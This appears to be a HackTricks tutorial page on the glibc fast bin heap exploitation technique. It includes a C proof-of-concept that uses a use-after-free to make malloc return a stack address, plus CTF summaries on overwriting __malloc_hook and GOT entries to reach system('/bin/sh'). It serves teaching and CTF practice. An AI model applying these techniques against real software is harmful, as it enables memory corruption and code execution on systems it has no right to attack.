_body: "# Fast Bin Attack\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Basic Information\n\nFor more information\
  \ about what is a fast bin check this page:\n\n\n{{#ref}}\nbins-and-memory-allocations.md\n{{#endref}}\n\nBecause the fast\
  \ bin is a singly linked list, there are much less protections than in other bins and just **modifying an address in a freed\
  \ fast bin** chunk is enough to be able to **allocate later a chunk in any memory address**.\n\nAs summary:\n\n```c\nptr0\
  \ = malloc(0x20);\nptr1 = malloc(0x20);\n\n// Put them in fast bin (suppose tcache is full)\nfree(ptr0)\nfree(ptr1)\n\n\
  // Use-after-free\n// Modify the address where the free chunk of ptr1 is pointing\n*ptr1 = (unsigned long)((char *)&<address>);\n\
  \nptr2 = malloc(0x20); // This will get ptr1\nptr3 = malloc(0x20); // This will get a chunk in the <address> which could\
  \ be abuse to overwrite arbitrary content inside of it\n```\n\nYou can find a full example in a very well explained code\
  \ from [https://guyinatuxedo.github.io/28-fastbin_attack/explanation_fastbinAttack/index.html](https://guyinatuxedo.github.io/28-fastbin_attack/explanation_fastbinAttack/index.html):\n\
  \n```c\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint main(void)\n{\n    puts(\"Today we will be discussing\
  \ a fastbin attack.\");\n    puts(\"There are 10 fastbins, which act as linked lists (they're separated by size).\");\n\
  \    puts(\"When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.\");\n   \
  \ puts(\"Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are\
  \ chunks in it).\");\n    puts(\"(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)\"\
  );\n    puts(\"\\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake\
  \ chunk we want to allocate.\");\n    puts(\"Pointers in this linked list are allocated when we allocate a chunk of the\
  \ size that corresponds to the fastbin.\");\n    puts(\"So we will just allocate chunks from the fastbin after we edit a\
  \ pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\\n\");\n    puts(\"So the tl;dr\
  \ objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\\n\");\n\n    puts(\"Let's start,\
  \ we will allocate three chunks of size 0x30\\n\");\n    unsigned long *ptr0, *ptr1, *ptr2;\n\n    ptr0 = malloc(0x30);\n\
  \    ptr1 = malloc(0x30);\n    ptr2 = malloc(0x30);\n\n    printf(\"Chunk 0: %p\\n\", ptr0);\n    printf(\"Chunk 1: %p\\\
  n\", ptr1);\n    printf(\"Chunk 2: %p\\n\\n\", ptr2);\n\n\n    printf(\"Next we will make an integer variable on the stack.\
  \ Our goal will be to allocate a chunk to this variable (because why not).\\n\");\n\n    int stackVar = 0x55;\n\n    printf(\"\
  Integer: %x\\t @: %p\\n\\n\", stackVar, &stackVar);\n\n    printf(\"Proceeding that I'm going to write just some data to\
  \ the three heap chunks\\n\");\n\n    char *data0 = \"00000000\";\n    char *data1 = \"11111111\";\n    char *data2 = \"\
  22222222\";\n\n    memcpy(ptr0, data0, 0x8);\n    memcpy(ptr1, data1, 0x8);\n    memcpy(ptr2, data2, 0x8);\n\n    printf(\"\
  We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\\n\"\
  );\n\n    printf(\"Chunk 0: %s\\n\", (char *)ptr0);\n    printf(\"Chunk 1: %s\\n\", (char *)ptr1);\n    printf(\"Chunk 2:\
  \ %s\\n\\n\", (char *)ptr2);\n\n    printf(\"Next we are going to free all three pointers. This will add all of them to\
  \ the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\\n\");\n\n    free(ptr0);\n\
  \    free(ptr1);\n    free(ptr2);\n\n    printf(\"Chunk0 @ 0x%p\\t contains: %lx\\n\", ptr0, *ptr0);\n    printf(\"Chunk1\
  \ @ 0x%p\\t contains: %lx\\n\", ptr1, *ptr1);\n    printf(\"Chunk2 @ 0x%p\\t contains: %lx\\n\\n\", ptr2, *ptr2);\n\n  \
  \  printf(\"So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the\
  \ next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked\
  \ list.\\n\\n\");\n\n\n    printf(\"Now we will edit a freed chunk (specifically the second chunk \\\"Chunk 1\\\"). We will\
  \ be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\\n\");\n    printf(\"We will\
  \ edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when\
  \ we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\\n\\n\"\
  );\n\n    *ptr1 = (unsigned long)((char *)&stackVar);\n\n    printf(\"We can see it's new value of Chunk1 @ %p\\t hold:\
  \ 0x%lx\\n\\n\", ptr1, *ptr1);\n\n\n    printf(\"Now we will allocate three new chunks. The first one will pretty much be\
  \ a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\\\
  n\");\n    printf(\"When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate\
  \ one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\\n\\n\");\n\n    unsigned long\
  \ *ptr3, *ptr4, *ptr5;\n\n    ptr3 = malloc(0x30);\n    ptr4 = malloc(0x30);\n    ptr5 = malloc(0x30);\n\n    printf(\"\
  Chunk 3: %p\\n\", ptr3);\n    printf(\"Chunk 4: %p\\n\", ptr4);\n    printf(\"Chunk 5: %p\\t Contains: 0x%x\\n\", ptr5,\
  \ (int)*ptr5);\n\n    printf(\"\\n\\nJust like that, we executed a fastbin attack to allocate an address to a stack variable\
  \ using malloc!\\n\");\n}\n```\n\n> [!CAUTION]\n> If it's possible to overwrite the value of the global variable **`global_max_fast`**\
  \ with a big number, this allows to generate fast bin chunks of bigger sizes, potentially allowing to perform fast bin attacks\
  \ in scenarios where it wasn't possible previously. This situation useful in the context of [large bin attack](large-bin-attack.md)\
  \ and [unsorted bin attack](unsorted-bin-attack.md)\n\n## Examples\n\n- **CTF** [**https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html**](https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html)**:**\n\
  \  - It's possible to allocate chunks, free them, read their contents and fill them (with an overflow vulnerability).\n\
  \    - **Consolidate chunk for infoleak**: The technique is basically to abuse the overflow to create a fake `prev_size`\
  \ so one previous chunks is put inside a bigger one, so when allocating the bigger one containing another chunk, it's possible\
  \ to print it's data an leak an address to libc (`main_arena+88`).\n    - **Overwrite malloc hook**: For this, and abusing\
  \ the previous overlapping situation, it was possible to have 2 chunks that were pointing to the same memory. Therefore,\
  \ freeing them both (freeing another chunk in between to avoid protections) it was possible to have the same chunk in the\
  \ fast bin 2 times. Then, it was possible to allocate it again, overwrite the address to the next chunk to point a bit before\
  \ `__malloc_hook` (so it points to an integer that malloc thinks is a free size - another bypass), allocate it again and\
  \ then allocate another chunk that will receive an address to malloc hooks.\\\n      Finally a **one gadget** was written\
  \ in there.\n- **CTF** [**https://guyinatuxedo.github.io/28-fastbin_attack/csaw17_auir/index.html**](https://guyinatuxedo.github.io/28-fastbin_attack/csaw17_auir/index.html)**:**\n\
  \  - There is a heap overflow and use after free and double free because when a chunk is freed it's possible to reuse and\
  \ re-free the pointers\n    - **Libc info leak**: Just free some chunks and they will get a pointer to a part of the main\
  \ arena location. As you can reuse freed pointers, just read this address.\n    - **Fast bin attack**: All the pointers\
  \ to the allocations are stored inside an array, so we can free a couple of fast bin chunks and in the last one overwrite\
  \ the address to point a bit before this array of pointers. Then, allocate a couple of chunks with the same size and we\
  \ will get first the legit one and then the fake one containing the array of pointers. We can now overwrite this allocation\
  \ pointers to make the GOT address of `free` point to `system` and then write `\"/bin/sh\"` in chunk 1 to then call `free(chunk1)`\
  \ which instead will execute `system(\"/bin/sh\")`.\n- **CTF** [**https://guyinatuxedo.github.io/33-custom_misc_heap/csaw19_traveller/index.html**](https://guyinatuxedo.github.io/33-custom_misc_heap/csaw19_traveller/index.html)\n\
  \  - Another example of abusing a one byte overflow to consolidate chunks in the unsorted bin and get a libc infoleak and\
  \ then perform a fast bin attack to overwrite malloc hook with a one gadget address\n- **CTF** [**https://guyinatuxedo.github.io/33-custom_misc_heap/csaw18_alienVSsamurai/index.html**](https://guyinatuxedo.github.io/33-custom_misc_heap/csaw18_alienVSsamurai/index.html)\n\
  \  - After an infoleak abusing the unsorted bin with a UAF to leak a libc address and a PIE address, the exploit of this\
  \ CTF used a fast bin attack to allocate a chunk in a place where the pointers to controlled chunks were located so it was\
  \ possible to overwrite certain pointers to write a one gadget in the GOT\n  - You can find a Fast Bin attack abused through\
  \ an unsorted bin attack:\n    - Note that it's common before performing fast bin attacks to abuse the free-lists to leak\
  \ libc/heap addresses (when needed).\n- [**Robot Factory. BlackHat MEA CTF 2022**](https://7rocky.github.io/en/ctf/other/blackhat-ctf/robot-factory/)\n\
  \  - We can only allocate chunks of size greater than `0x100`.\n  - Overwrite `global_max_fast` using an Unsorted Bin attack\
  \ (works 1/16 times due to ASLR, because we need to modify 12 bits, but we must modify 16 bits).\n  - Fast Bin attack to\
  \ modify the a global array of chunks. This gives an arbitrary read/write primitive, which allows to modify the GOT and\
  \ set some function to point to `system`.\n\n\n{{#ref}}\nunsorted-bin-attack.md\n{{#endref}}\n\n{{#include ../../banners/hacktricks-training.md}}"
